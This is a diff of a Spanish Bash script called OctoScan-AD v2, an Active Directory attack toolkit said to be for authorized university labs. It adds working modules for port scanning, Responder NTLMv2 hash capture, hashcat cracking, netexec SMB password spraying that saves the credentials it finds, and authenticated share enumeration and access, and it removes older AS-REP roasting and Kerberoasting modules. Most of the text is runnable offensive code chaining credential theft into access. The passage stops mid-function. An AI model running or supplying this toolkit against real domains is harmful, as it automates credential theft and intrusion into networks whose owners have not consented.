@@ -1,7 +1,8 @@
 #!/bin/bash
 # ============================================================
-#   🐙 OctoScan-AD — Herramienta de Pentesting para AD
-#   Laboratorio universitario — uso educativo
+#   🐙 OctoScan-AD v2 — Herramienta de Pentesting para AD
+#   Laboratorio universitario — uso educativo autorizado
+#   creado por: sayo
 # ============================================================
 
 RED='\033[0;31m'
@@ -12,31 +13,66 @@ BLUE='\033[0;34m'
 MAGENTA='\033[0;35m'
 WHITE='\033[1;37m'
 BOLD='\033[1m'
+DIM='\033[2m'
 NC='\033[0m'
 
 TARGET=""
 DOMAIN=""
+IFACE=""
 USERS_FILE=""
 PASSWORDS_FILE=""
+CRED_USER=""
+CRED_PASS=""
+CRED_HASH=""
 TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
 OUTPUT_DIR=""
 REPORT_FILE=""
 
+# Puertos AD y su estado (open/filtered)
+declare -A PORT_STATUS
+
 banner() {
     clear
     echo -e "${CYAN}"
-    echo "  ██████╗  ██████╗████████╗ ██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗      █████╗ ██████╗ "
-    echo " ██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║     ██╔══██╗██╔══██╗"
-    echo " ██║   ██║██║        ██║   ██║   ██║███████╗██║     ███████║██╔██╗ ██║     ███████║██║  ██║"
-    echo " ██║   ██║██║        ██║   ██║   ██║╚════██║██║     ██╔══██║██║╚██╗██║     ██╔══██║██║  ██║"
-    echo " ╚██████╔╝╚██████╗   ██║   ╚██████╔╝███████║╚██████╗██║  ██║██║ ╚████║     ██║  ██║██████╔╝"
-    echo "  ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═╝  ╚═╝╚═════╝ "
+    cat << 'ASCIIART'
+                                      ..-+##%#*=:.
+                                   =%+:.        ..=#*.
+                                .*+.                 -#=
+                               **                      :@:
+                             .%:                         ++
+                            .#.                           #-
+                            ==.:                         -:#.
+                            #: *.                       *: #.
+                            %: =+                      .@. *:           .::.
+                            %:.#-   .-:.        .:==.   %+ #:       .=*.    -*:
+             -*=--+*.       *=** -%@@@@@@=    .#@@@@@@%: #=%.      += .##=:-*-.+.
+           :*.===+: .*:     -%@.*@@@@@@@@@#-.=#@@@@@@@@@:-@#.     +. =#.     .#:+
+           = +    :%. +.    .%@.*@@@@@@@@@-: =-@@@@@@@@@:-@+     := :==       :*+
+           =*:     =* .#     *@..@@@@@@@@.=#%+=:@@@@@@@* -@.     := -:*        .
+                   ++ .%    ++.  .+***+- .#@@@#. -++*=-   .=+     +.::=:
+         ..-++=:. :*- ==    #-           .%@@@%.          :%.     =: +.#.
+       :*: ..   .-*::.+      =@- .:=-.   :@@#@@-   :#%#+=%#.      .# .=.#
+      :*+-.  .-+-+.+ .=       .=@+%+#*-   :: ::   -*##:++.        :*  = *.
+                :+:: :%:       ==.%  *-           :* =-.%.       .+. .= # ..:===-..
+                -=:- .=.++.  -#: =:  *.           .* .%. -#:  :+*:   +.+%-..     ..=+
+                .*.-. -+  .-=-:  +=   -*=:.     .-++.  .+    ..      **-. ...++=--=++:-=
+            .+%=:..:+#-.*:.    :*.        .-+++-.  .:   .#:       .=*:**-.  .:**.    .#+=
+          :+.          .*::=**+-.      :=           --     .+*+=+#+:=+.          :*.    .:
+ -+++.  .+:  .---:---.   .+.          :%-     =.    :%:           -*.  .--=====--  =-
+.#.+##+.#. .*:#=. .+#:=.   ==       .+:+.     #.    .+-+.       .*:   =:#+:.   ++-. ==  .****.
+=.=:   :+  --%:  ++:..:+.-   .*=--+#=..#.     .%-     .#..+*-.  ==   :-+-   .:*. .+-: =-  .::*:#:
+=.--  -+. =:+  .*=+===++%==    .=+===+-      .%.#.      -+=--=+=    :=%+++++-  -- .*=: ==    =:*-
+-+ :*. :*. .+=+   ++        +:=.               .*.  *.                =:*      .*  +   ++- .*-.  .+--%
+ :*. .:=++=:.  ==#.               .*=-         -#.   .=+             :+*:    -#+*..%.    :#+:  .:=++-..**.
+   -*=:.  .:-+*=.                   :+#*-.  .-++.       .=+-.      :+#*:       -++=:        :+**=---=*%+.
+      .-+*+=.                            :=+++-.               .=*##+=.
+ASCIIART
     echo -e "${NC}"
-    echo -e "${MAGENTA}  🐙 OctoScan-AD | Pentesting para Active Directory${NC}"
-    echo -e "${WHITE}  ──────────────────────────────────────────────────${NC}"
+    echo -e "${MAGENTA}  OctoScan-AD v2 | Pentesting para Active Directory${NC}"
+    echo -e "${WHITE}  ────────────────────────────────────────────────${NC}"
     echo -e "${YELLOW}  ⚠️  Solo para laboratorios autorizados${NC}"
-    echo -e "${WHITE}  ──────────────────────────────────────────────────${NC}"
-    echo -e "  \033[2;37mcreado por: sayo${NC}"
+    echo -e "${WHITE}  ────────────────────────────────────────────────${NC}"
+    echo -e "  ${DIM}creado por: sayo${NC}"
     echo ""
 }
 
@@ -53,13 +89,56 @@ log_section() {
     echo -e "\n========================================\n  $1\n========================================" >> "$REPORT_FILE" 2>/dev/null
 }
 
-# ─── Solo pide IP y ruta de guardado ────────────────────────
-pedir_target() {
-    echo -e "${WHITE}${BOLD}  Configuración${NC}"
-    echo -e "${WHITE}  ──────────────────────────────────────────${NC}"
+check_tool() {
+    command -v "$1" &>/dev/null
+}
+
+port_open() {
+    [ "${PORT_STATUS[$1]}" = "open" ]
+}
+
+# ─── PASO 1: Verificar y elegir interfaz de red ──────────────
+seleccionar_interfaz() {
+    log_section "PASO 1 — Interfaz de Red"
+    echo -e "${WHITE}  Interfaces disponibles:${NC}"
+    echo ""
+    nmcli device status 2>/dev/null | grep -v "^DEVICE" | while read line; do
+        DEV=$(echo "$line" | awk '{print $1}')
+        TYPE=$(echo "$line" | awk '{print $2}')
+        STATE=$(echo "$line" | awk '{print $3}')
+        if [ "$STATE" = "connected" ]; then
+            IP_IFACE=$(ip -4 addr show "$DEV" 2>/dev/null | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | head -1)
+            echo -e "  ${GREEN}▶ $DEV${NC}  ${DIM}[$TYPE]${NC}  ${GREEN}$STATE${NC}  ${CYAN}IP: ${IP_IFACE:-sin IP}${NC}"
+        else
+            echo -e "  ${DIM}  $DEV  [$TYPE]  $STATE${NC}"
+        fi
+    done
     echo ""
 
-    # IP del objetivo
+    # Interfaz conectada por defecto
+    DEFAULT_IFACE=$(nmcli device status 2>/dev/null | awk '$3=="connected" && $2!="loopback" {print $1; exit}')
+
+    echo -e "  ${YELLOW}Interfaz sugerida: ${WHITE}${DEFAULT_IFACE:-ninguna detectada}${NC}"
+    echo ""
+    read -p "$(echo -e ${CYAN}"  [?] Interfaz a usar (Enter para '$DEFAULT_IFACE'): "${NC})" INPUT_IFACE
+    IFACE="${INPUT_IFACE:-$DEFAULT_IFACE}"
+
+    if [ -z "$IFACE" ]; then
+        log_error "No se pudo detectar interfaz. Introduce una manualmente."
+        read -p "$(echo -e ${CYAN}"  [?] Interfaz: "${NC})" IFACE
+    fi
+
+    MY_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | head -1)
+    log_success "Interfaz seleccionada: $IFACE  (tu IP: ${MY_IP:-desconocida})"
+    echo ""
+}
+
+# ─── PASO 2: Configurar target ───────────────────────────────
+pedir_target() {
+    log_section "PASO 2 — Target y Resultados"
+    echo -e "${WHITE}  Configuración del objetivo${NC}"
+    echo ""
+
     while true; do
         read -p "$(echo -e ${CYAN}"  [?] IP del servidor objetivo: "${NC})" TARGET
         if [[ $TARGET =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
@@ -69,33 +148,20 @@ pedir_target() {
         fi
     done
 
-    # Ruta donde guardar resultados
     echo ""
-    echo -e "  ${YELLOW}¿Dónde quieres guardar los resultados?${NC}"
-    echo -e "  ${WHITE}Ejemplos: /root/Desktop  /home/kali  /tmp${NC}"
+    echo -e "  ${YELLOW}¿Dónde guardar los resultados?${NC}"
+    echo -e "  ${DIM}Ejemplos: /root/Desktop  /home/kali  /tmp${NC}"
     echo ""
     while true; do
         read -p "$(echo -e ${CYAN}"  [?] Ruta de guardado: "${NC})" BASE_DIR
         BASE_DIR="${BASE_DIR/#\~/$HOME}"
-        if [ -d "$BASE_DIR" ]; then
-            break
-        else
-            log_error "La ruta no existe: $BASE_DIR"
-            echo -e "  ${YELLOW}Tip:${NC} Verifica que la carpeta exista"
-        fi
+        [ -d "$BASE_DIR" ] && break
+        log_error "La ruta no existe: $BASE_DIR"
     done
 
-    # Nombre personalizado de la carpeta
     echo ""
-    echo -e "  ${YELLOW}Nombre para la carpeta de resultados${NC}"
-    echo -e "  ${WHITE}Se creará como: octoscan_results_[tu nombre]${NC}"
-    echo ""
-    read -p "$(echo -e ${CYAN}"  [?] Nombre: "${NC})" FOLDER_NAME
-    # Si no pone nada, usar timestamp
-    if [ -z "$FOLDER_NAME" ]; then
-        FOLDER_NAME="${TIMESTAMP}"
-    fi
-    # Quitar espacios y caracteres raros
+    read -p "$(echo -e ${CYAN}"  [?] Nombre de la carpeta (Enter = timestamp): "${NC})" FOLDER_NAME
+    [ -z "$FOLDER_NAME" ] && FOLDER_NAME="${TIMESTAMP}"
     FOLDER_NAME=$(echo "$FOLDER_NAME" | tr ' ' '_' | tr -cd '[:alnum:]_-')
 
     OUTPUT_DIR="$BASE_DIR/octoscan_results_${FOLDER_NAME}"
@@ -104,21 +170,71 @@ pedir_target() {
     if mkdir -p "$OUTPUT_DIR" 2>/dev/null; then
         log_success "Carpeta creada: $OUTPUT_DIR"
     else
-        log_error "Sin permisos en $BASE_DIR — intenta con /tmp"
         OUTPUT_DIR="/tmp/octoscan_results_${FOLDER_NAME}"
         REPORT_FILE="$OUTPUT_DIR/reporte_final.txt"
         mkdir -p "$OUTPUT_DIR"
         log_warn "Usando ruta alternativa: $OUTPUT_DIR"
     fi
 
-    echo "OctoScan-AD | Target: $TARGET | $(date)" > "$REPORT_FILE"
+    echo "OctoScan-AD v2 | Target: $TARGET | Iface: $IFACE | $(date)" > "$REPORT_FILE"
     echo ""
-    log_success "Target: $TARGET"
-    log_info "Resultados en: $OUTPUT_DIR"
+    log_success "Target:     $TARGET"
+    log_success "Interfaz:   $IFACE"
+    log_info    "Resultados: $OUTPUT_DIR"
     echo ""
 }
 
-# ─── Detecta dominio solo cuando lo necesita ────────────────
+# ─── PASO 3: Escaneo de puertos ──────────────────────────────
+modulo_portscan() {
+    log_section "PASO 3 — Escaneo de Puertos (NMAP)"
+    local out="$OUTPUT_DIR/01_nmap.txt"
+
+    log_info "Escaneando $TARGET con nmap -sV..."
+    nmap -sV -sC --open \
+        -p 53,80,88,135,139,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986,9389 \
+        "$TARGET" -oN "$out" 2>/dev/null
+
+    echo ""
+    echo -e "${BOLD}${WHITE}  Resultado del escaneo:${NC}"
+    echo -e "${WHITE}  ──────────────────────────────────────────${NC}"
+
+    declare -A PUERTOS_INFO
+    PUERTOS_INFO[53]="DNS"
+    PUERTOS_INFO[80]="HTTP"
+    PUERTOS_INFO[88]="Kerberos"
+    PUERTOS_INFO[135]="RPC"
+    PUERTOS_INFO[139]="NetBIOS"
+    PUERTOS_INFO[389]="LDAP"
+    PUERTOS_INFO[443]="HTTPS"
+    PUERTOS_INFO[445]="SMB"
+    PUERTOS_INFO[464]="Kerberos chpw"
+    PUERTOS_INFO[593]="RPC-HTTP"
+    PUERTOS_INFO[636]="LDAPS"
+    PUERTOS_INFO[1433]="MSSQL"
+    PUERTOS_INFO[3268]="Global Catalog"
+    PUERTOS_INFO[3269]="GC SSL"
+    PUERTOS_INFO[3389]="RDP"
+    PUERTOS_INFO[5985]="WinRM"
+    PUERTOS_INFO[5986]="WinRM-SSL"
+    PUERTOS_INFO[9389]="AD Web Services"
+
+    for puerto in "${!PUERTOS_INFO[@]}"; do
+        nombre="${PUERTOS_INFO[$puerto]}"
+        if grep -qE "^${puerto}/tcp.*open" "$out" 2>/dev/null; then
+            PORT_STATUS[$puerto]="open"
+            log_warn "  Puerto $puerto ($nombre) — ABIERTO ⚠️"
+        else
+            PORT_STATUS[$puerto]="closed"
+            log_success "  Puerto $puerto ($nombre) — cerrado/filtrado ✓"
+        fi
+    done
+
+    echo ""
+    log_success "Escaneo completado → $out"
+    cat "$out" >> "$REPORT_FILE"
+}
+
+# ─── Detectar dominio ────────────────────────────────────────
 detectar_dominio() {
     if [ -z "$DOMAIN" ]; then
         log_info "Detectando dominio automáticamente..."
@@ -126,160 +242,224 @@ detectar_dominio() {
             | grep "defaultNamingContext" \
             | sed 's/.*DC=\([^,]*\),DC=\([^,]*\).*/\1.\2/' \
             | head -1)
-
         if [ -n "$DOMAIN" ]; then
             log_success "Dominio detectado: $DOMAIN"
         else
-            log_warn "No se pudo detectar el dominio automáticamente"
+            log_warn "No se pudo detectar automáticamente"
             read -p "$(echo -e ${CYAN}"  [?] Introduce el dominio (ej: Technova.com): "${NC})" DOMAIN
         fi
     fi
 }
 
-# ─── Pide diccionarios solo cuando se necesitan ─────────────
+# ─── Pedir diccionarios ──────────────────────────────────────
 pedir_diccionarios() {
-    echo ""
-    echo -e "${WHITE}  ──────────────────────────────────────────${NC}"
-    echo -e "${CYAN}  Este módulo requiere diccionarios${NC}"
-    echo -e "${WHITE}  ──────────────────────────────────────────${NC}"
-    echo ""
-
     if [ -z "$USERS_FILE" ]; then
         while true; do
-            read -p "$(echo -e ${CYAN}"  [?] Archivo de usuarios (ej: /root/users.txt): "${NC})" USERS_FILE
-            if [ -f "$USERS_FILE" ]; then
-                log_success "Usuarios: $(wc -l < "$USERS_FILE") entradas cargadas"
-                break
-            else
-                log_error "No encontrado: $USERS_FILE"
-            fi
+            read -p "$(echo -e ${CYAN}"  [?] Archivo de usuarios: "${NC})" USERS_FILE
+            [ -f "$USERS_FILE" ] && { log_success "Usuarios: $(wc -l < "$USERS_FILE") entradas"; break; }
+            log_error "No encontrado: $USERS_FILE"
         done
     fi
-
     if [ -z "$PASSWORDS_FILE" ]; then
         while true; do
-            read -p "$(echo -e ${CYAN}"  [?] Archivo de contraseñas (ej: /root/passwords.txt): "${NC})" PASSWORDS_FILE
-            if [ -f "$PASSWORDS_FILE" ]; then
-                log_success "Contraseñas: $(wc -l < "$PASSWORDS_FILE") entradas cargadas"
-                break
-            else
-                log_error "No encontrado: $PASSWORDS_FILE"
-                echo -e "  ${YELLOW}Tip:${NC} Puedes usar /usr/share/wordlists/rockyou.txt"
-            fi
+            read -p "$(echo -e ${CYAN}"  [?] Archivo de contraseñas: "${NC})" PASSWORDS_FILE
+            [ -f "$PASSWORDS_FILE" ] && { log_success "Contraseñas: $(wc -l < "$PASSWORDS_FILE") entradas"; break; }
+            log_error "No encontrado: $PASSWORDS_FILE"
+            echo -e "  ${YELLOW}Tip:${NC} /usr/share/wordlists/rockyou.txt"
         done
+    fi
+}
+
+# ─── Guardar credenciales descubiertas ───────────────────────
+guardar_credenciales() {
+    local user="$1" pass="$2" origen="$3"
+    CRED_USER="$user"
+    CRED_PASS="$pass"
+    echo "$user:$pass" >> "$OUTPUT_DIR/credenciales_encontradas.txt"
+    log_success "Credencial guardada: $user:$pass  [origen: $origen]"
+}
+
+mostrar_credenciales() {
+    echo ""
+    echo -e "${BOLD}${WHITE}  Credenciales disponibles:${NC}"
+    if [ -n "$CRED_USER" ]; then
+        echo -e "  ${GREEN}Usuario:    $CRED_USER${NC}"
+        echo -e "  ${GREEN}Contraseña: $CRED_PASS${NC}"
+        [ -n "$CRED_HASH" ] && echo -e "  ${YELLOW}Hash:       $CRED_HASH${NC}"
+    else
+        echo -e "  ${YELLOW}No hay credenciales aún — usa un módulo de ataque primero${NC}"
     fi
     echo ""
 }
 
-# ─── MÓDULO 1: NMAP ─────────────────────────────────────────
-modulo_nmap() {
-    log_section "MÓDULO 1 — Escaneo de Puertos (NMAP)"
-    local out="$OUTPUT_DIR/01_nmap.txt"
-
-    log_info "Escaneando $TARGET..."
-    nmap -sV -sC --open \
-        -p 53,88,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389 \
-        "$TARGET" -oN "$out" 2>/dev/null
-
-    echo ""
-    log_info "Puertos críticos:"
-    for entry in "445:SMB" "135:RPC" "139:NetBIOS" "5985:WinRM" "5986:WinRM-SSL"; do
-        p="${entry%%:*}"; n="${entry##*:}"
-        if grep -q "$p/tcp.*open" "$out" 2>/dev/null; then
-            log_warn "Puerto $p ($n) — ABIERTO ⚠️"
-        else
-            log_success "Puerto $p ($n) — filtrado ✓"
-        fi
-    done
-
-    cat "$out" >> "$REPORT_FILE"
-    log_success "Completado → $out"
-}
-
-# ─── MÓDULO 2: LDAP ─────────────────────────────────────────
+# ─── MÓDULO A: LDAP anónimo ──────────────────────────────────
 modulo_ldap() {
-    log_section "MÓDULO 2 — Reconocimiento LDAP"
-    local out="$OUTPUT_DIR/02_ldap.txt"
-
+    if ! port_open 389; then
+        log_warn "Puerto 389 (LDAP) cerrado — módulo deshabilitado"
+        return
+    fi
+    log_section "MÓDULO — Reconocimiento LDAP"
+    local out="$OUTPUT_DIR/ldap.txt"
     detectar_dominio
-
-    log_info "Consultando LDAP anónimo..."
+    log_info "Consultando LDAP anónimo en $TARGET..."
     ldapsearch -x -H "ldap://$TARGET" -s base > "$out" 2>&1
-
     if grep -q "result: 0 Success" "$out"; then
         log_warn "LDAP anónimo responde — información expuesta:"
-        grep -E "dnsHostName|defaultNamingContext|domainFunctionality" "$out" \
+        grep -E "dnsHostName|defaultNamingContext|domainFunctionality|serverName" "$out" \
             | while read l; do log_warn "  → $l"; done
     else
         log_success "LDAP anónimo bloqueado ✓"
     fi
-
     cat "$out" >> "$REPORT_FILE"
     log_success "Completado → $out"
 }
 
-# ─── MÓDULO 3: DNS ───────────────────────────────────────────
-modulo_dns() {
-    log_section "MÓDULO 3 — Enumeración DNS"
-    local out="$OUTPUT_DIR/03_dns.txt"
+# ─── MÓDULO B: Captura de hash con Responder ─────────────────
+modulo_responder() {
+    log_section "MÓDULO — Captura de Hash (Responder)"
+    echo -e "  ${YELLOW}Esto capturará hashes NTLMv2 cuando un cliente de la red intente autenticarse${NC}"
+    echo -e "  ${CYAN}Interfaz: $IFACE${NC}"
+    echo ""
 
-    detectar_dominio
-
-    log_info "Intentando transferencia de zona para $DOMAIN..."
-    dig axfr "$DOMAIN" @"$TARGET" > "$out" 2>&1
-
-    if grep -qE "Transfer failed|REFUSED|connection refused" "$out"; then
-        log_success "Transferencia de zona bloqueada ✓"
-    else
-        log_warn "¡Transferencia de zona exitosa! Datos del dominio expuestos"
-    fi
-
-    cat "$out" >> "$REPORT_FILE"
-    log_success "Completado → $out"
-}
-
-# ─── MÓDULO 4: RPC ───────────────────────────────────────────
-modulo_rpc() {
-    log_section "MÓDULO 4 — Enumeración RPC"
-    local out="$OUTPUT_DIR/04_rpc.txt"
-
-    log_info "Intentando RPC anónimo en $TARGET..."
-    result=$(rpcclient -U "" -N "$TARGET" -c "enumdomusers" 2>/dev/null)
-
-    if echo "$result" | grep -q "user:"; then
-        log_warn "¡RPC anónimo activo! Usuarios expuestos:"
-        echo "$result" | tee "$out"
-    else
-        log_success "RPC anónimo bloqueado ✓"
-        echo "RPC bloqueado" > "$out"
-    fi
-
-    cat "$out" >> "$REPORT_FILE"
-    log_success "Completado → $out"
-}
-
-# ─── MÓDULO 5: SMB Bruteforce ────────────────────────────────
-modulo_smb_bruteforce() {
-    log_section "MÓDULO 5 — Ataque de Diccionario SMB"
-    local out="$OUTPUT_DIR/05_smb_bruteforce.txt"
-
-    pedir_diccionarios
-
-    if ! command -v netexec &>/dev/null; then
-        log_error "netexec no disponible — instala con: sudo apt install netexec"
+    if ! check_tool responder; then
+        log_error "responder no disponible — instala: sudo apt install responder"
         return
     fi
 
-    log_warn "Lockout activo en 5 intentos por cuenta"
-    log_info "Iniciando ataque contra $TARGET..."
+    local out="$OUTPUT_DIR/responder_hashes.txt"
+    log_warn "Iniciando Responder en $IFACE — Ctrl+C para detener cuando captures un hash"
+    echo ""
+    sudo responder -I "$IFACE" -dwv 2>&1 | tee "$out"
+
+    echo ""
+    # Buscar hashes capturados en logs de responder
+    HASH_FILE=$(find /usr/share/responder/logs/ -name "*.txt" -newer "$REPORT_FILE" 2>/dev/null | head -1)
+    if [ -n "$HASH_FILE" ]; then
+        CRED_HASH=$(grep -oP '[A-Za-z0-9_-]+::[A-Z0-9]+:[A-Fa-f0-9]+:[A-Fa-f0-9]+:[A-Fa-f0-9]+' "$HASH_FILE" | head -1)
+        if [ -n "$CRED_HASH" ]; then
+            log_success "Hash capturado:"
+            echo -e "  ${CYAN}$CRED_HASH${NC}"
+            echo "$CRED_HASH" > "$OUTPUT_DIR/hash_capturado.txt"
+            log_info "Guardado en: $OUTPUT_DIR/hash_capturado.txt"
+            echo ""
+            log_info "Siguiente paso: Módulo de crackeo de hash (opción en menú)"
+        fi
+    else
+        log_warn "No se detectaron hashes automáticamente"
+        echo ""
+        read -p "$(echo -e ${CYAN}"  [?] Pega el hash NTLMv2 manualmente (o Enter para saltar): "${NC})" MANUAL_HASH
+        if [ -n "$MANUAL_HASH" ]; then
+            CRED_HASH="$MANUAL_HASH"
+            echo "$CRED_HASH" > "$OUTPUT_DIR/hash_capturado.txt"
+            log_success "Hash guardado"
+        fi
+    fi
+}
+
+# ─── MÓDULO C: Crackeo de hash con Hashcat ───────────────────
+modulo_hashcat() {
+    log_section "MÓDULO — Crackeo de Hash (Hashcat)"
+
+    if ! check_tool hashcat; then
+        log_error "hashcat no disponible — instala: sudo apt install hashcat"
+        return
+    fi
+
+    # Verificar que hay hash
+    if [ -z "$CRED_HASH" ]; then
+        if [ -f "$OUTPUT_DIR/hash_capturado.txt" ]; then
+            CRED_HASH=$(cat "$OUTPUT_DIR/hash_capturado.txt")
+            log_info "Hash cargado desde archivo"
+        else
+            read -p "$(echo -e ${CYAN}"  [?] Pega el hash NTLMv2: "${NC})" CRED_HASH
+            echo "$CRED_HASH" > "$OUTPUT_DIR/hash_capturado.txt"
+        fi
+    fi
+
+    echo -e "  ${CYAN}Hash a crackear:${NC} ${DIM}${CRED_HASH:0:60}...${NC}"
+    echo ""
+    echo -e "  ${WHITE}Modo de ataque:${NC}"
+    echo -e "  ${CYAN}[1]${NC} Diccionario  ${DIM}(rockyou.txt — rápido)${NC}"
+    echo -e "  ${CYAN}[2]${NC} Fuerza bruta ${DIM}(?a x6 — más exhaustivo, más lento)${NC}"
+    echo -e "  ${CYAN}[3]${NC} Ambos en secuencia"
+    echo ""
+    read -p "$(echo -e ${CYAN}"  [?] Opción: "${NC})" HC_OPT
+
+    local out="$OUTPUT_DIR/hashcat_resultado.txt"
+
+    case $HC_OPT in
+        1|3)
+            log_info "Atacando con diccionario..."
+            hashcat -m 5600 -a 0 "$OUTPUT_DIR/hash_capturado.txt" \
+                /usr/share/wordlists/rockyou.txt \
+                --potfile-path "$OUTPUT_DIR/hashcat.pot" \
+                --outfile "$out" 2>/dev/null
+            ;;
+    esac
+
+    case $HC_OPT in
+        2|3)
+            log_info "Atacando con fuerza bruta (?a x 6)..."
+            hashcat -m 5600 -a 3 "$OUTPUT_DIR/hash_capturado.txt" \
+                "?a?a?a?a?a?a" \
+                --potfile-path "$OUTPUT_DIR/hashcat.pot" \
+                --outfile "$out" --outfile-append 2>/dev/null
+            ;;
+    esac
+
+    echo ""
+    if [ -f "$out" ] && [ -s "$out" ]; then
+        CRACKED=$(cat "$out" | head -1)
+        log_success "¡Hash crackeado!"
+        echo -e "  ${GREEN}${BOLD}$CRACKED${NC}"
+        # Extraer usuario y contraseña
+        CRED_USER=$(echo "$CRACKED" | cut -d':' -f1)
+        CRED_PASS=$(echo "$CRACKED" | rev | cut -d':' -f1 | rev)
+        guardar_credenciales "$CRED_USER" "$CRED_PASS" "hashcat"
+    else
+        # Buscar en potfile
+        POT=$(hashcat -m 5600 "$OUTPUT_DIR/hash_capturado.txt" \
+            --potfile-path "$OUTPUT_DIR/hashcat.pot" --show 2>/dev/null | head -1)
+        if [ -n "$POT" ]; then
+            log_success "¡Contraseña encontrada (potfile)!"
+            echo -e "  ${GREEN}${BOLD}$POT${NC}"
+            CRED_PASS=$(echo "$POT" | rev | cut -d':' -f1 | rev)
+        else
+            log_warn "No se pudo crackear el hash con los métodos elegidos"
+        fi
+    fi
+    cat "$out" >> "$REPORT_FILE" 2>/dev/null
+}
+
+# ─── MÓDULO D: SMB Bruteforce / Netexec ──────────────────────
+modulo_smb_netexec() {
+    if ! port_open 445; then
+        log_warn "Puerto 445 (SMB) cerrado — módulo deshabilitado"
+        return
+    fi
+    log_section "MÓDULO — Ataque Diccionario SMB (netexec)"
+
+    pedir_diccionarios
+
+    if ! check_tool netexec; then
+        log_error "netexec no disponible — instala: sudo apt install netexec"
+        return
+    fi
+
+    local out="$OUTPUT_DIR/smb_netexec.txt"
+    log_warn "Iniciando ataque contra $TARGET..."
     netexec smb "$TARGET" -u "$USERS_FILE" -p "$PASSWORDS_FILE" \
         --continue-on-success 2>/dev/null | tee "$out"
 
     echo ""
     if grep -q "\[+\]" "$out"; then
         log_success "¡Credenciales válidas encontradas!"
-        grep "\[+\]" "$out" | while read l; do log_success "  → $l"; done
-        grep -i "pwn3d\|admin" "$out" | while read l; do log_warn "  🔥 ADMIN: $l"; done
+        grep "\[+\]" "$out" | while read l; do
+            log_success "  → $l"
+            U=$(echo "$l" | grep -oP '(?<=\\)[^\s]+')
+            P=$(echo "$l" | grep -oP '(?<=:)[^\s]+$')
+            [ -n "$U" ] && guardar_credenciales "$U" "$P" "netexec-smb"
+        done
     else
         log_success "No se encontraron credenciales válidas ✓"
     fi
@@ -288,49 +468,231 @@ modulo_smb_bruteforce() {
     log_success "Completado → $out"
 }
 
-# ─── MÓDULO 6: AS-REP Roasting ───────────────────────────────
-modulo_asrep() {
-    log_section "MÓDULO 6 — AS-REP Roasting"
-    local out="$OUTPUT_DIR/06_asrep.txt"
-
-    detectar_dominio
-    pedir_diccionarios
-
-    if ! command -v impacket-GetNPUsers &>/dev/null; then
-        log_error "impacket-GetNPUsers no disponible"
+# ─── MÓDULO E: Enumeración SMB con credenciales ──────────────
+modulo_smb_enum() {
+    if ! port_open 445; then
+        log_warn "Puerto 445 (SMB) cerrado — módulo deshabilitado"
         return
     fi
+    log_section "MÓDULO — Enumeración SMB (crackmapexec + smbmap)"
+    mostrar_credenciales
 
-    log_info "Buscando cuentas sin preautenticación Kerberos..."
-    impacket-GetNPUsers "$DOMAIN/" -dc-ip "$TARGET" \
-        -no-pass -usersfile "$USERS_FILE" 2>/dev/null | tee "$out"
+    if [ -z "$CRED_USER" ]; then
+        read -p "$(echo -e ${CYAN}"  [?] Usuario: "${NC})" CRED_USER
+        read -p "$(echo -e ${CYAN}"  [?] Contraseña: "${NC})" CRED_PASS
+    fi
 
-    if grep -q "\$krb5asrep\$" "$out"; then
-        log_warn "¡Hash AS-REP obtenido! Guardando..."
-        grep "\$krb5asrep\$" "$out" > "$OUTPUT_DIR/hashes_asrep.txt"
-        log_info "Crackear: hashcat -m 18200 $OUTPUT_DIR/hashes_asrep.txt /usr/share/wordlists/rockyou.txt"
+    local out="$OUTPUT_DIR/smb_enum.txt"
+
+    # crackmapexec para shares
+    if check_tool crackmapexec; then
+        log_info "Enumerando shares con crackmapexec..."
+        crackmapexec smb "$TARGET" -u "$CRED_USER" -p "$CRED_PASS" --shares 2>/dev/null | tee "$out"
+    elif check_tool netexec; then
+        log_info "Enumerando shares con netexec..."
+        netexec smb "$TARGET" -u "$CRED_USER" -p "$CRED_PASS" --shares 2>/dev/null | tee "$out"
     else
-        log_success "Ninguna cuenta vulnerable ✓"
+        log_warn "crackmapexec/netexec no disponible"
+    fi
+
+    echo ""
+
+    # smbmap para análisis de privilegios
+    if check_tool smbmap; then
+        log_info "Analizando privilegios con smbmap..."
+        smbmap -H "$TARGET" -u "$CRED_USER" -p "$CRED_PASS" 2>/dev/null | tee -a "$out"
+    else
+        log_warn "smbmap no disponible — instala: sudo apt install smbmap"
     fi
 
     cat "$out" >> "$REPORT_FILE"
     log_success "Completado → $out"
 }
 
-# ─── MÓDULO 7: Kerberoasting ─────────────────────────────────
-modulo_kerberoasting() {
-    log_section "MÓDULO 7 — Kerberoasting"
-    local out="$OUTPUT_DIR/07_kerberoasting.txt"
+# ─── MÓDULO F: Acceso y extracción SMB ───────────────────────
+modulo_smb_acceso() {
+    if ! port_open 445; then
+        log_warn "Puerto 445 (SMB) cerrado — módulo deshabilitado"
+        return
+    fi
+    log_section "MÓDULO — Acceso y Extracción SMB (smbclient)"
+    mostrar_credenciales
 
+    if [ -z "$CRED_USER" ]; then
+        read -p "$(echo -e ${CYAN}"  [?] Usuario: "${NC})" CRED_USER
+        read -p "$(echo -e ${CYAN}"  [?] Contraseña: "${NC})" CRED_PASS
+    fi
+
+    detectar_dominio
+
+    if ! check_tool smbclient; then
+        log_error "smbclient no disponible — instala: sudo apt install smbclient"
+        return
+    fi
+
+    echo ""
+    echo -e "  ${WHITE}¿Qué recurso quieres acceder?${NC}"
+    echo -e "  ${CYAN}[1]${NC} SYSVOL  ${DIM}(políticas de dominio)${NC}"
+    echo -e "  ${CYAN}[2]${NC} NETLOGON"
+    echo -e "  ${CYAN}[3]${NC} Listar todos los recursos disponibles"
+    echo -e "  ${CYAN}[4]${NC} Recurso personalizado"
+    echo ""
+    read -p "$(echo -e ${CYAN}"  [?] Opción: "${NC})" SMB_OPT
+
+    case $SMB_OPT in
+        1)
+            log_info "Accediendo a SYSVOL..."
